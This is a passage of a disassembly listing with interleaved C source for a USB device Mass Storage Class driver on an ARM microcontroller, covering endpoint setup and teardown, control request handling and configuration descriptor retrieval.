    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008fe4:	4b24      	ldr	r3, [pc, #144]	; (8009078 <USBD_MSC_Init+0x11c>)
 8008fe6:	7819      	ldrb	r1, [r3, #0]
 8008fe8:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008fec:	2202      	movs	r2, #2
 8008fee:	6878      	ldr	r0, [r7, #4]
 8008ff0:	f003 feb4 	bl	800cd5c <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008ff4:	4b20      	ldr	r3, [pc, #128]	; (8009078 <USBD_MSC_Init+0x11c>)
 8008ff6:	781b      	ldrb	r3, [r3, #0]
 8008ff8:	f003 020f 	and.w	r2, r3, #15
 8008ffc:	6879      	ldr	r1, [r7, #4]
 8008ffe:	4613      	mov	r3, r2
 8009000:	009b      	lsls	r3, r3, #2
 8009002:	4413      	add	r3, r2
 8009004:	009b      	lsls	r3, r3, #2
 8009006:	440b      	add	r3, r1
 8009008:	3324      	adds	r3, #36	; 0x24
 800900a:	2201      	movs	r2, #1
 800900c:	801a      	strh	r2, [r3, #0]
 800900e:	e028      	b.n	8009062 <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8009010:	4b18      	ldr	r3, [pc, #96]	; (8009074 <USBD_MSC_Init+0x118>)
 8009012:	7819      	ldrb	r1, [r3, #0]
 8009014:	2340      	movs	r3, #64	; 0x40
 8009016:	2202      	movs	r2, #2
 8009018:	6878      	ldr	r0, [r7, #4]
 800901a:	f003 fe9f 	bl	800cd5c <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 800901e:	4b15      	ldr	r3, [pc, #84]	; (8009074 <USBD_MSC_Init+0x118>)
 8009020:	781b      	ldrb	r3, [r3, #0]
 8009022:	f003 020f 	and.w	r2, r3, #15
 8009026:	6879      	ldr	r1, [r7, #4]
 8009028:	4613      	mov	r3, r2
 800902a:	009b      	lsls	r3, r3, #2
 800902c:	4413      	add	r3, r2
 800902e:	009b      	lsls	r3, r3, #2
 8009030:	440b      	add	r3, r1
 8009032:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8009036:	2201      	movs	r2, #1
 8009038:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 800903a:	4b0f      	ldr	r3, [pc, #60]	; (8009078 <USBD_MSC_Init+0x11c>)
 800903c:	7819      	ldrb	r1, [r3, #0]
 800903e:	2340      	movs	r3, #64	; 0x40
 8009040:	2202      	movs	r2, #2
 8009042:	6878      	ldr	r0, [r7, #4]
 8009044:	f003 fe8a 	bl	800cd5c <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8009048:	4b0b      	ldr	r3, [pc, #44]	; (8009078 <USBD_MSC_Init+0x11c>)
 800904a:	781b      	ldrb	r3, [r3, #0]
 800904c:	f003 020f 	and.w	r2, r3, #15
 8009050:	6879      	ldr	r1, [r7, #4]
 8009052:	4613      	mov	r3, r2
 8009054:	009b      	lsls	r3, r3, #2
 8009056:	4413      	add	r3, r2
 8009058:	009b      	lsls	r3, r3, #2
 800905a:	440b      	add	r3, r1
 800905c:	3324      	adds	r3, #36	; 0x24
 800905e:	2201      	movs	r2, #1
 8009060:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8009062:	6878      	ldr	r0, [r7, #4]
 8009064:	f000 fa2c 	bl	80094c0 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8009068:	2300      	movs	r3, #0
}
 800906a:	4618      	mov	r0, r3
 800906c:	3710      	adds	r7, #16
 800906e:	46bd      	mov	sp, r7
 8009070:	bd80      	pop	{r7, pc}
 8009072:	bf00      	nop
 8009074:	2000010b 	.word	0x2000010b
 8009078:	2000010a 	.word	0x2000010a

0800907c <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800907c:	b580      	push	{r7, lr}
 800907e:	b082      	sub	sp, #8
 8009080:	af00      	add	r7, sp, #0
 8009082:	6078      	str	r0, [r7, #4]
 8009084:	460b      	mov	r3, r1
 8009086:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8009088:	4b26      	ldr	r3, [pc, #152]	; (8009124 <USBD_MSC_DeInit+0xa8>)
 800908a:	781b      	ldrb	r3, [r3, #0]
 800908c:	4619      	mov	r1, r3
 800908e:	6878      	ldr	r0, [r7, #4]
 8009090:	f003 fea2 	bl	800cdd8 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8009094:	4b23      	ldr	r3, [pc, #140]	; (8009124 <USBD_MSC_DeInit+0xa8>)
 8009096:	781b      	ldrb	r3, [r3, #0]
 8009098:	f003 020f 	and.w	r2, r3, #15
 800909c:	6879      	ldr	r1, [r7, #4]
 800909e:	4613      	mov	r3, r2
 80090a0:	009b      	lsls	r3, r3, #2
 80090a2:	4413      	add	r3, r2
 80090a4:	009b      	lsls	r3, r3, #2
 80090a6:	440b      	add	r3, r1
 80090a8:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80090ac:	2200      	movs	r2, #0
 80090ae:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 80090b0:	4b1d      	ldr	r3, [pc, #116]	; (8009128 <USBD_MSC_DeInit+0xac>)
 80090b2:	781b      	ldrb	r3, [r3, #0]
 80090b4:	4619      	mov	r1, r3
 80090b6:	6878      	ldr	r0, [r7, #4]
 80090b8:	f003 fe8e 	bl	800cdd8 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 80090bc:	4b1a      	ldr	r3, [pc, #104]	; (8009128 <USBD_MSC_DeInit+0xac>)
 80090be:	781b      	ldrb	r3, [r3, #0]
 80090c0:	f003 020f 	and.w	r2, r3, #15
 80090c4:	6879      	ldr	r1, [r7, #4]
 80090c6:	4613      	mov	r3, r2
 80090c8:	009b      	lsls	r3, r3, #2
 80090ca:	4413      	add	r3, r2
 80090cc:	009b      	lsls	r3, r3, #2
 80090ce:	440b      	add	r3, r1
 80090d0:	3324      	adds	r3, #36	; 0x24
 80090d2:	2200      	movs	r2, #0
 80090d4:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 80090d6:	687b      	ldr	r3, [r7, #4]
 80090d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80090dc:	687b      	ldr	r3, [r7, #4]
 80090de:	32b0      	adds	r2, #176	; 0xb0
 80090e0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80090e4:	2b00      	cmp	r3, #0
 80090e6:	d018      	beq.n	800911a <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 80090e8:	6878      	ldr	r0, [r7, #4]
 80090ea:	f000 fa6f 	bl	80095cc <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80090ee:	687b      	ldr	r3, [r7, #4]
 80090f0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80090f4:	687b      	ldr	r3, [r7, #4]
 80090f6:	32b0      	adds	r2, #176	; 0xb0
 80090f8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80090fc:	4618      	mov	r0, r3
 80090fe:	f004 f87d 	bl	800d1fc <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8009102:	687b      	ldr	r3, [r7, #4]
 8009104:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009108:	687b      	ldr	r3, [r7, #4]
 800910a:	32b0      	adds	r2, #176	; 0xb0
 800910c:	2100      	movs	r1, #0
 800910e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8009112:	687b      	ldr	r3, [r7, #4]
 8009114:	2200      	movs	r2, #0
 8009116:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 800911a:	2300      	movs	r3, #0
}
 800911c:	4618      	mov	r0, r3
 800911e:	3708      	adds	r7, #8
 8009120:	46bd      	mov	sp, r7
 8009122:	bd80      	pop	{r7, pc}
 8009124:	2000010b 	.word	0x2000010b
 8009128:	2000010a 	.word	0x2000010a

0800912c <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800912c:	b580      	push	{r7, lr}
 800912e:	b086      	sub	sp, #24
 8009130:	af00      	add	r7, sp, #0
 8009132:	6078      	str	r0, [r7, #4]
 8009134:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009136:	687b      	ldr	r3, [r7, #4]
 8009138:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800913c:	687b      	ldr	r3, [r7, #4]
 800913e:	32b0      	adds	r2, #176	; 0xb0
 8009140:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009144:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8009146:	2300      	movs	r3, #0
 8009148:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 800914a:	2300      	movs	r3, #0
 800914c:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800914e:	693b      	ldr	r3, [r7, #16]
 8009150:	2b00      	cmp	r3, #0
 8009152:	d101      	bne.n	8009158 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8009154:	2303      	movs	r3, #3
 8009156:	e0e1      	b.n	800931c <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8009158:	683b      	ldr	r3, [r7, #0]
 800915a:	781b      	ldrb	r3, [r3, #0]
 800915c:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8009160:	2b00      	cmp	r3, #0
 8009162:	d053      	beq.n	800920c <USBD_MSC_Setup+0xe0>
 8009164:	2b20      	cmp	r3, #32
 8009166:	f040 80d1 	bne.w	800930c <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 800916a:	683b      	ldr	r3, [r7, #0]
 800916c:	785b      	ldrb	r3, [r3, #1]
 800916e:	2bfe      	cmp	r3, #254	; 0xfe
 8009170:	d002      	beq.n	8009178 <USBD_MSC_Setup+0x4c>
 8009172:	2bff      	cmp	r3, #255	; 0xff
 8009174:	d02a      	beq.n	80091cc <USBD_MSC_Setup+0xa0>
 8009176:	e041      	b.n	80091fc <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8009178:	683b      	ldr	r3, [r7, #0]
 800917a:	885b      	ldrh	r3, [r3, #2]
 800917c:	2b00      	cmp	r3, #0
 800917e:	d11e      	bne.n	80091be <USBD_MSC_Setup+0x92>
 8009180:	683b      	ldr	r3, [r7, #0]
 8009182:	88db      	ldrh	r3, [r3, #6]
 8009184:	2b01      	cmp	r3, #1
 8009186:	d11a      	bne.n	80091be <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8009188:	683b      	ldr	r3, [r7, #0]
 800918a:	781b      	ldrb	r3, [r3, #0]
 800918c:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 800918e:	2b00      	cmp	r3, #0
 8009190:	da15      	bge.n	80091be <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8009192:	687b      	ldr	r3, [r7, #4]
 8009194:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009198:	687a      	ldr	r2, [r7, #4]
 800919a:	33b0      	adds	r3, #176	; 0xb0
 800919c:	009b      	lsls	r3, r3, #2
 800919e:	4413      	add	r3, r2
 80091a0:	685b      	ldr	r3, [r3, #4]
 80091a2:	699b      	ldr	r3, [r3, #24]
 80091a4:	4798      	blx	r3
 80091a6:	4603      	mov	r3, r0
 80091a8:	461a      	mov	r2, r3
 80091aa:	693b      	ldr	r3, [r7, #16]
 80091ac:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 80091ae:	693b      	ldr	r3, [r7, #16]
 80091b0:	2201      	movs	r2, #1
 80091b2:	4619      	mov	r1, r3
 80091b4:	6878      	ldr	r0, [r7, #4]
 80091b6:	f003 f979 	bl	800c4ac <USBD_CtlSendData>
 80091ba:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80091bc:	e025      	b.n	800920a <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 80091be:	6839      	ldr	r1, [r7, #0]
 80091c0:	6878      	ldr	r0, [r7, #4]
 80091c2:	f003 f902 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 80091c6:	2303      	movs	r3, #3
 80091c8:	75fb      	strb	r3, [r7, #23]
          break;
 80091ca:	e01e      	b.n	800920a <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 80091cc:	683b      	ldr	r3, [r7, #0]
 80091ce:	885b      	ldrh	r3, [r3, #2]
 80091d0:	2b00      	cmp	r3, #0
 80091d2:	d10c      	bne.n	80091ee <USBD_MSC_Setup+0xc2>
 80091d4:	683b      	ldr	r3, [r7, #0]
 80091d6:	88db      	ldrh	r3, [r3, #6]
 80091d8:	2b00      	cmp	r3, #0
 80091da:	d108      	bne.n	80091ee <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 80091dc:	683b      	ldr	r3, [r7, #0]
 80091de:	781b      	ldrb	r3, [r3, #0]
 80091e0:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 80091e2:	2b00      	cmp	r3, #0
 80091e4:	db03      	blt.n	80091ee <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 80091e6:	6878      	ldr	r0, [r7, #4]
 80091e8:	f000 f9bc 	bl	8009564 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80091ec:	e00d      	b.n	800920a <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 80091ee:	6839      	ldr	r1, [r7, #0]
 80091f0:	6878      	ldr	r0, [r7, #4]
 80091f2:	f003 f8ea 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 80091f6:	2303      	movs	r3, #3
 80091f8:	75fb      	strb	r3, [r7, #23]
          break;
 80091fa:	e006      	b.n	800920a <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 80091fc:	6839      	ldr	r1, [r7, #0]
 80091fe:	6878      	ldr	r0, [r7, #4]
 8009200:	f003 f8e3 	bl	800c3ca <USBD_CtlError>
          ret = USBD_FAIL;
 8009204:	2303      	movs	r3, #3
 8009206:	75fb      	strb	r3, [r7, #23]
          break;
 8009208:	bf00      	nop
      }
      break;
 800920a:	e086      	b.n	800931a <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800920c:	683b      	ldr	r3, [r7, #0]
 800920e:	785b      	ldrb	r3, [r3, #1]
 8009210:	2b0b      	cmp	r3, #11
 8009212:	d872      	bhi.n	80092fa <USBD_MSC_Setup+0x1ce>
 8009214:	a201      	add	r2, pc, #4	; (adr r2, 800921c <USBD_MSC_Setup+0xf0>)
 8009216:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800921a:	bf00      	nop
 800921c:	0800924d 	.word	0x0800924d
 8009220:	080092c9 	.word	0x080092c9
 8009224:	080092fb 	.word	0x080092fb
 8009228:	080092fb 	.word	0x080092fb
 800922c:	080092fb 	.word	0x080092fb
 8009230:	080092fb 	.word	0x080092fb
 8009234:	080092fb 	.word	0x080092fb
 8009238:	080092fb 	.word	0x080092fb
 800923c:	080092fb 	.word	0x080092fb
 8009240:	080092fb 	.word	0x080092fb
 8009244:	08009277 	.word	0x08009277
 8009248:	080092a1 	.word	0x080092a1
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800924c:	687b      	ldr	r3, [r7, #4]
 800924e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009252:	b2db      	uxtb	r3, r3
 8009254:	2b03      	cmp	r3, #3
 8009256:	d107      	bne.n	8009268 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8009258:	f107 030e 	add.w	r3, r7, #14
 800925c:	2202      	movs	r2, #2
 800925e:	4619      	mov	r1, r3
 8009260:	6878      	ldr	r0, [r7, #4]
 8009262:	f003 f923 	bl	800c4ac <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009266:	e050      	b.n	800930a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009268:	6839      	ldr	r1, [r7, #0]
 800926a:	6878      	ldr	r0, [r7, #4]
 800926c:	f003 f8ad 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 8009270:	2303      	movs	r3, #3
 8009272:	75fb      	strb	r3, [r7, #23]
          break;
 8009274:	e049      	b.n	800930a <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009276:	687b      	ldr	r3, [r7, #4]
 8009278:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800927c:	b2db      	uxtb	r3, r3
 800927e:	2b03      	cmp	r3, #3
 8009280:	d107      	bne.n	8009292 <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 8009282:	693b      	ldr	r3, [r7, #16]
 8009284:	3304      	adds	r3, #4
 8009286:	2201      	movs	r2, #1
 8009288:	4619      	mov	r1, r3
 800928a:	6878      	ldr	r0, [r7, #4]
 800928c:	f003 f90e 	bl	800c4ac <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009290:	e03b      	b.n	800930a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009292:	6839      	ldr	r1, [r7, #0]
 8009294:	6878      	ldr	r0, [r7, #4]
 8009296:	f003 f898 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 800929a:	2303      	movs	r3, #3
 800929c:	75fb      	strb	r3, [r7, #23]
          break;
 800929e:	e034      	b.n	800930a <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80092a0:	687b      	ldr	r3, [r7, #4]
 80092a2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80092a6:	b2db      	uxtb	r3, r3
 80092a8:	2b03      	cmp	r3, #3
 80092aa:	d106      	bne.n	80092ba <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 80092ac:	683b      	ldr	r3, [r7, #0]
 80092ae:	885b      	ldrh	r3, [r3, #2]
 80092b0:	b2db      	uxtb	r3, r3
 80092b2:	461a      	mov	r2, r3
 80092b4:	693b      	ldr	r3, [r7, #16]
 80092b6:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80092b8:	e027      	b.n	800930a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80092ba:	6839      	ldr	r1, [r7, #0]
 80092bc:	6878      	ldr	r0, [r7, #4]
 80092be:	f003 f884 	bl	800c3ca <USBD_CtlError>
            ret = USBD_FAIL;
 80092c2:	2303      	movs	r3, #3
 80092c4:	75fb      	strb	r3, [r7, #23]
          break;
 80092c6:	e020      	b.n	800930a <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80092c8:	687b      	ldr	r3, [r7, #4]
 80092ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80092ce:	b2db      	uxtb	r3, r3
 80092d0:	2b03      	cmp	r3, #3
 80092d2:	d119      	bne.n	8009308 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 80092d4:	683b      	ldr	r3, [r7, #0]
 80092d6:	885b      	ldrh	r3, [r3, #2]
 80092d8:	2b00      	cmp	r3, #0
 80092da:	d115      	bne.n	8009308 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 80092dc:	683b      	ldr	r3, [r7, #0]
 80092de:	889b      	ldrh	r3, [r3, #4]
 80092e0:	b2db      	uxtb	r3, r3
 80092e2:	4619      	mov	r1, r3
 80092e4:	6878      	ldr	r0, [r7, #4]
 80092e6:	f003 fdad 	bl	800ce44 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 80092ea:	683b      	ldr	r3, [r7, #0]
 80092ec:	889b      	ldrh	r3, [r3, #4]
 80092ee:	b2db      	uxtb	r3, r3
 80092f0:	4619      	mov	r1, r3
 80092f2:	6878      	ldr	r0, [r7, #4]
 80092f4:	f000 fb54 	bl	80099a0 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 80092f8:	e006      	b.n	8009308 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 80092fa:	6839      	ldr	r1, [r7, #0]
 80092fc:	6878      	ldr	r0, [r7, #4]
 80092fe:	f003 f864 	bl	800c3ca <USBD_CtlError>
          ret = USBD_FAIL;
 8009302:	2303      	movs	r3, #3
 8009304:	75fb      	strb	r3, [r7, #23]
          break;
 8009306:	e000      	b.n	800930a <USBD_MSC_Setup+0x1de>
          break;
 8009308:	bf00      	nop
      }
      break;
 800930a:	e006      	b.n	800931a <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 800930c:	6839      	ldr	r1, [r7, #0]
 800930e:	6878      	ldr	r0, [r7, #4]
 8009310:	f003 f85b 	bl	800c3ca <USBD_CtlError>
      ret = USBD_FAIL;
 8009314:	2303      	movs	r3, #3
 8009316:	75fb      	strb	r3, [r7, #23]
      break;
 8009318:	bf00      	nop
  }

  return (uint8_t)ret;
 800931a:	7dfb      	ldrb	r3, [r7, #23]
}
 800931c:	4618      	mov	r0, r3
 800931e:	3718      	adds	r7, #24
 8009320:	46bd      	mov	sp, r7
 8009322:	bd80      	pop	{r7, pc}

08009324 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009324:	b580      	push	{r7, lr}
 8009326:	b082      	sub	sp, #8
 8009328:	af00      	add	r7, sp, #0
 800932a:	6078      	str	r0, [r7, #4]
 800932c:	460b      	mov	r3, r1
 800932e:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 8009330:	78fb      	ldrb	r3, [r7, #3]
 8009332:	4619      	mov	r1, r3
 8009334:	6878      	ldr	r0, [r7, #4]
 8009336:	f000 f961 	bl	80095fc <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 800933a:	2300      	movs	r3, #0
}
 800933c:	4618      	mov	r0, r3
 800933e:	3708      	adds	r7, #8
 8009340:	46bd      	mov	sp, r7
 8009342:	bd80      	pop	{r7, pc}

08009344 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009344:	b580      	push	{r7, lr}
 8009346:	b082      	sub	sp, #8
 8009348:	af00      	add	r7, sp, #0
 800934a:	6078      	str	r0, [r7, #4]
 800934c:	460b      	mov	r3, r1
 800934e:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009350:	78fb      	ldrb	r3, [r7, #3]
 8009352:	4619      	mov	r1, r3
 8009354:	6878      	ldr	r0, [r7, #4]
 8009356:	f000 f98d 	bl	8009674 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 800935a:	2300      	movs	r3, #0
}
 800935c:	4618      	mov	r0, r3
 800935e:	3708      	adds	r7, #8
 8009360:	46bd      	mov	sp, r7
 8009362:	bd80      	pop	{r7, pc}

08009364 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 8009364:	b580      	push	{r7, lr}
 8009366:	b084      	sub	sp, #16
 8009368:	af00      	add	r7, sp, #0
 800936a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 800936c:	2181      	movs	r1, #129	; 0x81
 800936e:	4812      	ldr	r0, [pc, #72]	; (80093b8 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009370:	f002 f9c8 	bl	800b704 <USBD_GetEpDesc>
 8009374:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009376:	2101      	movs	r1, #1
 8009378:	480f      	ldr	r0, [pc, #60]	; (80093b8 <USBD_MSC_GetHSCfgDesc+0x54>)
 800937a:	f002 f9c3 	bl	800b704 <USBD_GetEpDesc>
 800937e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009380:	68fb      	ldr	r3, [r7, #12]
 8009382:	2b00      	cmp	r3, #0
 8009384:	d006      	beq.n	8009394 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009386:	68fb      	ldr	r3, [r7, #12]
 8009388:	2200      	movs	r2, #0
 800938a:	711a      	strb	r2, [r3, #4]
 800938c:	2200      	movs	r2, #0
 800938e:	f042 0202 	orr.w	r2, r2, #2
 8009392:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009394:	68bb      	ldr	r3, [r7, #8]
 8009396:	2b00      	cmp	r3, #0
 8009398:	d006      	beq.n	80093a8 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800939a:	68bb      	ldr	r3, [r7, #8]
 800939c:	2200      	movs	r2, #0
 800939e:	711a      	strb	r2, [r3, #4]
 80093a0:	2200      	movs	r2, #0
 80093a2:	f042 0202 	orr.w	r2, r2, #2
 80093a6:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80093a8:	687b      	ldr	r3, [r7, #4]
 80093aa:	2220      	movs	r2, #32
 80093ac:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80093ae:	4b02      	ldr	r3, [pc, #8]	; (80093b8 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 80093b0:	4618      	mov	r0, r3
 80093b2:	3710      	adds	r7, #16
 80093b4:	46bd      	mov	sp, r7
 80093b6:	bd80      	pop	{r7, pc}
 80093b8:	200000e0 	.word	0x200000e0

080093bc <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 80093bc:	b580      	push	{r7, lr}
 80093be:	b084      	sub	sp, #16
 80093c0:	af00      	add	r7, sp, #0
